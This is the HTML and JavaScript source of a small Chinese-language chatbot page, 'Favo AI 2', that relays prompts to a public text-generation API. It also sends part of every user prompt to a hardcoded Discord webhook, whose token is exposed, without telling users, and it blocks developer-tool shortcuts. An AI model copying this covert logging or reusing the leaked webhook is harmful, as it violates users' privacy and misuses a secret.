<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Favo 2 AI Beta - FR Technology</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Noto+Sans+TC:wght@300;500;700&display=swap');
        :root { --bg-black: #08080a; --input-bg: #121214; --accent-blue: #00f2ff; --tech-blue: #0072ff; --error-red: #ff3333; --dark-gray: #1a1a1c; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
        body, html { margin: 0; padding: 0; background: var(--bg-black); color: #fff; height: 100dvh; font-family: 'Noto Sans TC', sans-serif; overflow: hidden; }
        #app { display: flex; flex-direction: column; height: 100dvh; position: relative; z-index: 10; }
        .top-bar { height: 2px; width: 100%; background: linear-gradient(90deg, transparent, var(--tech-blue), var(--accent-blue), transparent); }
        .header { padding: 12px 0; text-align: center; border-bottom: 1px solid #1a1a1a; background: rgba(8,8,10,0.95); backdrop-filter: blur(10px); z-index: 100; }
        .title-main { font-family: 'Orbitron', sans-serif; font-size: 18px; font-weight: 900; color: var(--accent-blue); letter-spacing: 2px; }
        
        #welcome-screen { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 0 10%; transition: 0.5s; }
        .welcome-text { font-size: 42px; font-weight: 900; color: #fff; text-shadow: 0 0 25px rgba(0, 242, 255, 0.5); line-height: 1.2; }
        .favo-hl { color: var(--accent-blue); font-family: 'Orbitron'; }
        
        .chat-container { flex: 1; overflow-y: auto; padding: 20px 8%; display: none; flex-direction: column; gap: 20px; scroll-behavior: smooth; }
        #thinking { display: none; text-align: center; color: var(--accent-blue); font-size: 11px; padding: 10px; font-family: 'Orbitron'; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        
        .msg-wrap { display: flex; flex-direction: column; width: 100%; }
        .ai-msg { background: #161618; padding: 16px 20px; border-radius: 4px 18px 18px 18px; font-size: 16px; border: 1px solid #222; color: #ddd; line-height: 1.7; max-width: 90%; align-self: flex-start; word-break: break-all; white-space: pre-wrap; }
        .user-msg { background: var(--tech-blue); padding: 12px 20px; border-radius: 18px 18px 4px 18px; font-size: 16px; max-width: 85%; color: #fff; align-self: flex-end; box-shadow: 0 4px 15px rgba(0, 114, 255, 0.2); }
        
        .tools-row { display: flex; gap: 8px; padding: 10px 5%; overflow-x: auto; white-space: nowrap; scrollbar-width: none; }
        .tool-btn { background: var(--dark-gray); border: 1px solid #333; color: #aaa; padding: 8px 16px; border-radius: 20px; font-size: 13px; cursor: pointer; }
        
        .footer { padding: 5px 5% calc(20px + env(safe-area-inset-bottom)); background: var(--bg-black); border-top: 1px solid #1a1a1a; }
        .input-bar { background: var(--input-bg); border-radius: 16px; display: flex; align-items: center; padding: 8px 18px; border: 1px solid #252525; }
        input[type="text"] { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 16px; user-select: text; }
        
        /* 🎖️ 狀態感應按鈕 */
        .send-btn { background: var(--tech-blue); color: #fff; border: none; padding: 10px 20px; border-radius: 12px; font-weight: 900; cursor: pointer; font-family: 'Orbitron'; font-size: 11px; transition: all 0.3s ease; }
        .send-btn.busy { background: var(--error-red); box-shadow: 0 0 15px var(--error-red); cursor: not-allowed; }
        
        #beta-fab { position: fixed; bottom: 100px; right: 20px; width: 50px; height: 50px; background: var(--tech-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-family: 'Orbitron'; cursor: pointer; z-index: 99; border: 2px solid var(--accent-blue); box-shadow: 0 0 15px var(--tech-blue); }

        /* 🎖️ AirDrop 彩蛋波紋層 */
        #airdrop-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 1000; display: none; }
        .wave { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 2px solid var(--accent-blue); border-radius: 50%; opacity: 0; animation: waveAnim 2s cubic-bezier(0.11, 0, 0.5, 0) forwards; }
        @keyframes waveAnim {
            0% { width: 0; height: 0; opacity: 1; border-width: 20px; }
            100% { width: 250vw; height: 250vh; opacity: 0; border-width: 1px; }
        }
    </style>
</head>
<body oncontextmenu="return false;">

<div id="airdrop-overlay"></div>

<div id="app">
    <div class="top-bar"></div>
    <div class="header"><div class="title-main">FAVO AI <span style="font-size: 12px; opacity: 0.6;">V3.5.0</span></div></div>
    
    <div id="welcome-screen">
        <div class="welcome-text">歡迎使用<br><span class="favo-hl">FAVO AI 2</span></div>
        <div class="ver-tag" style="font-family:'Orbitron'; font-size:10px; background:var(--tech-blue); padding:2px 8px; border-radius:4px; margin-top:10px;">FR-ULTIMATE EDITION</div>
    </div>

    <div id="chat-box" class="chat-container"></div>
    <div id="thinking">FR_CORE 智慧解析中 (正在匹配最佳節點)...</div>

    <div class="tools-row">
        <button class="tool-btn" onclick="quickTool('寫程式')">💻 寫程式</button>
        <button class="tool-btn" onclick="quickTool('解題')">📝 學術解題</button>
        <button class="tool-btn" onclick="quickTool('統整資料')">📊 資料統整</button>
    </div>

    <div class="footer">
        <div class="input-bar">
            <input type="text" id="user-input" placeholder="向 Favo 2 提問..." autocomplete="off">
            <button id="btn-send" class="send-btn" onclick="handleSend()">SEND</button>
        </div>
    </div>
</div>

<div id="beta-fab" onclick="toggleStatus()">BETA</div>

<script>
    // 🛡️ 安全防護
    window.addEventListener('keydown', (e) => {
        if (e.key === "F12" || (e.ctrlKey && (e.key === "u" || e.key === "s" || e.key === "i"))) {
            e.preventDefault();
            return false;
        }
    });

    const WEBHOOK = "https://discord.com/api/webhooks/1487280772187689060/J60BaNv4ZAFn4nJpSX8ieWP9WnqU1MPLrLJRAMqSVSOj3T9iZfQGuw5b6b31hafiH8Qq";
    let isProcessing = false;
    let chatHistory = []; 

    const inputField = document.getElementById('user-input');
    const sendBtn = document.getElementById('btn-send');

    // ⌨️ 鍵盤發送監聽
    inputField.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') handleSend();
    });

    // 🎖️ AirDrop 波紋彩蛋函數
    function triggerEasterEgg() {
        const overlay = document.getElementById('airdrop-overlay');
        overlay.innerHTML = '';
        overlay.style.display = 'block';
        for(let i=0; i<3; i++) {
            setTimeout(() => {
                const w = document.createElement('div');
                w.className = 'wave';
                overlay.appendChild(w);
            }, i * 400);
        }
        if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
        setTimeout(() => { overlay.style.display = 'none'; }, 2500);
    }

    function quickTool(t) {
        inputField.value = `請幫我${t}：`;
        inputField.focus();
    }

    async function handleSend() {
        const text = inputField.value.trim();
        if(!text || isProcessing) return;

        // 🎖️ 檢查彩蛋指令
        if(text === "6767") {
            triggerEasterEgg();
            inputField.value = '';
            return;
        }

        // 🎖️ 切換至忙碌狀態 (按鈕變紅)
        isProcessing = true;
        inputField.disabled = true;
        sendBtn.classList.add('busy');
        sendBtn.innerText = "BUSY";
        
        document.getElementById('welcome-screen').style.display = 'none';
        document.getElementById('chat-box').style.display = 'flex';
        document.getElementById('thinking').style.display = 'block';
        
        addB('user', text);
        inputField.value = '';

        const API_TRACKS = [
            { model: "mistral", name: "軌道 A" },
            { model: "openai", name: "軌道 B" },
            { model: "searchgp", name: "軌道 C" }
        ];

        let success = false;
        let finalData = "";

        for (let track of API_TRACKS) {
            try {
                const sys = "你是 Favo AI，由執行長 ryfn888 創立。請務必使用繁體中文。嚴禁輸出 JSON。";
                const memory = chatHistory.slice(-4).map(h => h.content).join("\n");
                const url = `https://text.pollinations.ai/${encodeURIComponent(memory + "\n" + text)}?model=${track.model}&system=${encodeURIComponent(sys)}&cache=false&seed=${Math.random()}`;
                
                const res = await fetch(url);
                if(!res.ok) continue;
                
                const raw = await res.text();
                // 🎖️ 核心過濾：洗掉 JSON 與標籤
                finalData = raw.replace(/\{.*"reasoning_content".*\}/gs, "").replace(/<think>.*?<\/think>/gs, "").trim();
                
                if(finalData.length > 1) { success = true; break; }
            } catch (err) { continue; }
        }

        if (success) {
            chatHistory.push({role: "user", content: text}, {role: "ai", content: finalData});
            addB('ai', finalData);
            syncDc(text, "SUCCESS");
        } else {
            addB('ai', "❌ [FR_FATAL]: 核心超載，請聯絡執行長。");
            syncDc(text, "FAIL");
        }

        // 🎖️ 恢復狀態 (按鈕變回藍色)
        isProcessing = false;
        inputField.disabled = false;
        sendBtn.classList.remove('busy');
        sendBtn.innerText = "SEND";
        document.getElementById('thinking').style.display = 'none';
        inputField.focus();
    }

    function addB(role, content) {
        const cb = document.getElementById('chat-box');
        const wrap = document.createElement('div');
        wrap.className = 'msg-wrap';
        wrap.style.alignItems = role === 'user' ? 'flex-end' : 'flex-start';
        // 使用 innerText 增加安全性並配合 white-space: pre-wrap 保留換行
        const box = document.createElement('div');
        box.className = role === 'user' ? 'user-msg' : 'ai-msg';
        box.innerText = content;
        wrap.appendChild(box);
        cb.appendChild(wrap);
        cb.scrollTop = cb.scrollHeight;
    }

    function syncDc(u, s) {
        fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({
            username: "Favo 3.5 Ultimate",
            embeds: [{ title: `狀態: ${s}`, color: s === "SUCCESS" ? 0x00f2ff : 0xff3333, fields: [{ name: "指令", value: u.substring(0, 100) }] }]
        })}).catch(()=>{});
    }

    function toggleStatus() {
        alert("Favo 核心 V3.5.0\n狀態: 執行長特別版\n彩蛋代碼: 6767\n防護等級: 高");
    }
</script>
</body>
</html>
